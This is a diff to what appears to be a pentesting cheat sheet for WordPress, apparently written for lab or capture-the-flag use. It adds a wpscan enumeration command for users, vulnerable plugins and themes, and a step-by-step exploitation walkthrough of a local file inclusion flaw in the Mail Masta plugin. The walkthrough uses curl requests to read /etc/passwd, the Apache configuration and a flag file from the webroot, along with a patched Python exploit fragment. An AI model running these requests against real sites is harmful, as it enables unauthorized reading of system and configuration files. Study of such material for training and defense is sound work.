@@ -22,6 +22,9 @@ curl -s http://TARGET/readme.html
 # Basic scan
 wpscan --url http://TARGET
 
+# Enumerate users, vulnerable plugins, and vulnerable themes in one pass
+wpscan --url http://TARGET -e u,vp,vt
+
 # Enumerate users
 wpscan --url http://TARGET --enumerate u
 
@@ -120,6 +123,38 @@ Use the first or second for Meterpreter; the third runs a single command via `?c
 
 ```bash
 curl http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+
+**Full exploitation walkthrough:**
+
+1. Confirm LFI by reading `/etc/passwd`:
+
+```bash
+curl 'http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
+```
+
+2. Read Apache config to find the document root:
+
+```bash
+curl 'http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/apache2.conf'
+# Look for: <Directory /var/www/>
+```
+
+3. Read files from the discovered webroot:
+
+```bash
+curl 'http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/flag.txt'
+```
+
+There is also a Python exploit script on Exploit-DB (`mail-masta.py`) that automates fuzzing for files via this LFI. The original script has bugs — the fixed version uses a try/except fallback to manually read `/etc/passwd` if the wordlist is missing:
+
+```python
+except:
+    response = requests.get(target + endpoint + "/etc/passwd")
+    if len(response.content) > 500:
+        print(response.content)
+    else:
+        print("likely failed, confirm manually with: curl http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd")
 ```
 
 ### wpDiscuz RCE (CVE-2020-24186)
